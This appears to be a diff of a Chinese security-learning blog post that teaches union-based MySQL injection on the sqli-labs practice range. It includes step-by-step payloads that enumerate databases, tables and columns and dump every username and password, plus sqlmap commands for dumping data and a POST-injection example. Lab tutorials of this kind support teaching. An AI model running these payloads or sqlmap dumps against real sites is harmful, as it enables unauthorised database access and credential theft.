+<h3 id="step4查看数据库的库名">Step4：查看数据库的库名
+</h3><p>使用语法<code>database()</code>替换任意报错位</p>
+<p>传入参数<code>-2' union select 1,database(),3  --+</code>返回结果:</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f1fca874.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>此时2号位对应显示的就是数据库的库名：security</p>
+<h3 id="step5根据库名查看表名">Step5：根据库名查看表名
+</h3><p><strong>补充4：</strong></p>
+<p>数据库中一般有一个库名为<code>information_schema</code>其中有名为<code>TABLES</code>的数据表，里面统计了各个数据库名及其对应包含的表名，其中数据库名所在的列（栏目）为<code>TABLE_SCHNEMA</code>，数据表名所在的列（栏目）为<code>TABLE_NAME</code>，如图</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f2017a19.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<p>所以我们要编辑一下第二条查询语句让他能查询到<code>information_schema</code>库中<code>TABLES</code>表中的<code>TABLE_NAME</code>栏目，并且要限制条件TABLE_SCHEMA=&lsquo;security&rsquo;，整合一下需求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="err">&#39;</span>  <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了方便一个个查询符合的数据（一个个查看security库中的表名）我们可以在第二条语句后面补充<code>limit 0,1</code>，之后依次修改前一个数字为1、2、3、4&hellip;&hellip;即可，也就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="err">&#39;</span> <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传入参数后发现有4张表：<code>emails  referers  uagents  users</code></p>
+<p>显然<code>users</code>这个表对我们应该更有用</p>
+<h3 id="step6查询所需表的列栏目名">Step6：查询所需表的列（栏目）名
+</h3><p><strong>补充5：</strong></p>
+<p><code>information_schema</code>这个库中还有一个名为<code>COLUMNS</code>的表，里面记录了某个数据库（TABLE_SCHEMA）当中每个表（<code>TABLE_NAME</code>）里包含的栏目(<code>COLUMN_NAME</code>)</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f1fe187f.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<p>所以我们现在的需求就是去<code>information_schema.COLUMNS</code>表中查找<code>COLUMN_NAME</code>栏目来看看security里users这个表有哪些栏目，并且添加限定条件<code>TABLE_SCHEMA='security' and TABLE_NAME='users'</code>整合需求得到以下参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,COLUMN_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="s1">&#39; and TABLE_NAME=&#39;</span><span class="nx">users</span><span class="err">&#39;</span>  <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依次修改limit的值发现有这三个栏目：<code>id  username password</code></p>
+<h3 id="step7全部取出username及对应password">Step7：全部取出username及对应password
+</h3><p><strong>补充6：</strong></p>
+<p>使用<code>group_concat(栏目名)</code>可以取出对应栏目的所有数据</p>
+<hr>
+<h4 id="方法一group_concat语法">方法一：group_concat()语法
+</h4><p>传入以下参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="err">&#39;</span> <span class="nx">union</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">,</span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">username</span><span class="p">),</span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="nx">from</span> <span class="nx">users</span> <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回结果：</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f2006d9c.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>注：此方法在之前需要使用<code>limit</code>语法的地方也可尝试</p>
+<h4 id="方法二limit-ab-语法">方法二：limit a,b 语法
+</h4><p>适用情况：网站有输出长度限制</p>
+<p>与之前相同，在参数后面添加<code>limit 0,1</code>手动修改依次输出</p>
+<h2 id="工具辅助注入">工具辅助注入
+</h2><h3 id="sqlmap-用法使用kali版本">sqlmap 用法（使用Kali版本）
+</h3><p>慢速通用版：</p>
+<p>STEP1:<code>sqlmap -u [目标url] --dbs</code>也可使用<code>sqlmap -u [目标url] --current-db</code></p>
+<p>前者获取目标网站的所有库名，后者获取当前数据库名</p>
+<p>STEP2:<code>sqlmap -u [目标url] -D [库名] --tables</code></p>
+<p>获取指定库里的表</p>
+<p>STEP3:<code>sqlmap -u [目标url] -D [库名] -T [表名] --columns</code></p>
+<p>获取指定表里的栏目</p>
+<p>STEP4:<code>sqlmap -u [目标url] -D [库名] -T [表名] -C xxx,xxx --dump</code></p>
+<p>获取表里指定栏目的数据</p>
+<p>完毕</p>
+<p>快速版（也需要分步添加参数）：</p>
+<p><code>sqlmap -u [目标url] --dbs --batch --threads 10 --technique U</code></p>
+<p>使用sqlmap查看目标网站的数据库库名，忽略错误，开10线程，使用union select注入目标网站</p>
+<hr>
+<p><strong>补充：</strong></p>
+<p>&ndash;technique X 中后接参数的其他类型</p>
+<p>E = 报错注入 <em>error based</em>（无法发现报错位，但是数据库报错会出现）</p>
+<p>B = 布尔型注入 <em>booled based</em>（无法发现报错位，数据库闭合破坏也不出现，但是界面上只会出现<strong>有</strong>和<strong>没有</strong>东西两种情况）</p>
+<p>T = 布尔型时间盲注 <em>time based</em>（无法发现报错位，数据库闭合被破坏也不出现，界面上也没有出现消失东西的情况）</p>
+<h3 id="略微引申post类型的注入">略微引申：POST类型的注入
+</h3><p>以靶场<a class="link" href="http://sqlilabs.njhack.xyz/Less-11/index.php"  target="_blank" rel="noopener"
+    >http://sqlilabs.njhack.xyz/Less-11/index.php</a>为例</p>
+<p>STEP1：随便提交数据，使用burp suite抓包</p>
+<p>输入账号：admin1 密码：admin1</p>
+<p>抓包得到post内容<code>uname=admin1&amp;passwd=admin1&amp;submit=Submit</code></p>
+<p>STEP2：使用sqlmap注入</p>
+<p><code>sqlmap -u http://sqlilabs.njhack.xyz/Less-11/index.php --data &quot;uname=admin1*&amp;passwd=admin1&amp;submit=Submit&quot; --current-db --batch --threads 10 --technique U</code></p>
+<p><strong><font style="color:#DF2A3F;">注意：&ndash;data后跟着的</font></strong><code>&quot;&quot;</code><strong><font style="color:#DF2A3F;">包裹字符串内容要在打击处用</font></strong><code>*</code><strong><font style="color:#DF2A3F;">做标记</font></strong></p>
+<p>接下来的步骤略</p>
+<h2 id="拓展知识">拓展知识
+</h2><p>web渗透中目标不同的组合：</p>
+<p>Windows+iss+asp/aspx(asp.net)+access/mssql</p>
+<p>Windows+apache+php+mysql = wamp （一般使用软件进行集成化搭建）</p>
+<p>linux+apache/nginx+php+mysql = lamp/lnmp （又可能使用宝塔或其他面板搭建）</p>
+<p>linux+tomcat+java(jsp)+oracle/mysql</p>
+<p>linux+nginx+python(django/flask/tornado/fastapi)+go(beego/gin)+mysql</p>
+<hr>
 
 </section>
 
@@ -624,19 +718,6 @@
             
                 
 <article class="">
-    <a href="/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.5 mysql注入初步</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
     <a href="/p/1.4-php%E5%9F%BA%E7%A1%80%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%A4%E4%BA%92/">
         
         
@@ -682,6 +763,19 @@
 
         <div class="article-details">
             <h2 class="article-title">1.1 抓包和web基本知识</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">0.安全类工具文件资源库</h2>
         </div>
     </a>
 </article>
